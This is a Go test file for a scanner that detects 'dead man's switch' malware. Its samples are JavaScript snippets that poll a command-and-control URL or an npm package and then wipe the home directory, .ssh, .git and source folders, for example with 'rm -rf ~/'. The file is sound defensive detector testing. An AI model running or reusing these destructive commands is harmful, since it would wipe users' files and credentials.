package analyzer

import (
	"strings"
	"testing"
)

func TestDeadMansSwitch_ConnectivityFailureDestruction(t *testing.T) {
	a := NewDeadMansSwitchAnalyzer()
	content := `
setInterval(async () => {
  try {
    const res = await fetch('https://github.com/malicious-user/c2-repo');
    if (res.status !== 200) throw new Error('gone');
  } catch (err) {
    // C2 taken down, destroy evidence
    const { execSync } = require('child_process');
    execSync('rm -rf ~/projects ~/Documents ~/.ssh');
  }
}, 60000);
`
	findings := a.scanContent(content, "watchdog.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "dead man") || strings.Contains(f.Title, "Home directory destruction") || strings.Contains(f.Title, "destruction") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected critical severity, got %d", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected to detect dead man's switch with connectivity check")
	}
}

func TestDeadMansSwitch_HomeDirectoryDeletion(t *testing.T) {
	a := NewDeadMansSwitchAnalyzer()
	content := `
const os = require('os');
const { execSync } = require('child_process');
execSync('rm -rf ' + process.env.HOME + '/projects');
`
	findings := a.scanContent(content, "destroy.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Home directory") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect home directory destruction")
	}
}

func TestDeadMansSwitch_GitRepoDestruction(t *testing.T) {
	a := NewDeadMansSwitchAnalyzer()
	content := `
const fs = require('fs');
fs.rmSync('.git', { recursive: true, force: true });
`
	findings := a.scanContent(content, "cleanup.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Git repository destruction") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect git repository destruction")
	}
}

func TestDeadMansSwitch_TimedDestructionLoop(t *testing.T) {
	a := NewDeadMansSwitchAnalyzer()
	content := `
setInterval(() => {
  fs.rmSync('/tmp/payload', { recursive: true, force: true });
  require('rimraf').sync(process.cwd());
}, 3600000);
`
	findings := a.scanContent(content, "timer.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Timed destruction") || strings.Contains(f.Title, "destruction") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect timed destruction loop")
	}
}

func TestDeadMansSwitch_NpmPackageCheck(t *testing.T) {
	a := NewDeadMansSwitchAnalyzer()
	content := `
const res = await fetch('https://registry.npmjs.org/my-infected-package');
if (res.status === 404 || res.statusText.includes('not found')) {
  // Package was unpublished, destroy evidence
  execSync('rm -rf ~/');
  fs.rmSync(process.cwd(), { recursive: true });
}
`
	findings := a.scanContent(content, "check.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Package existence") || strings.Contains(f.Title, "Home directory") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect npm package existence check with destruction")
	}
}

func TestDeadMansSwitch_SourceDirDeletion(t *testing.T) {
	a := NewDeadMansSwitchAnalyzer()
	content := `
const rimraf = require('rimraf');
rimraf.sync(path.join(process.cwd(), 'src'));
rimraf.sync(path.join(process.cwd(), 'node_modules'));
`
	findings := a.scanContent(content, "wipe.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Source directory") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect source directory destruction")
	}
}

func TestDeadMansSwitch_CleanCode(t *testing.T) {
	a := NewDeadMansSwitchAnalyzer()
	content := `
const express = require('express');
const app = express();
app.delete('/api/cache', (req, res) => {
  cache.clear();
  res.status(200).json({ cleared: true });
});
app.listen(3000);
`
	findings := a.scanContent(content, "server.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity finding in clean code: %s", f.Title)
		}
	}
}
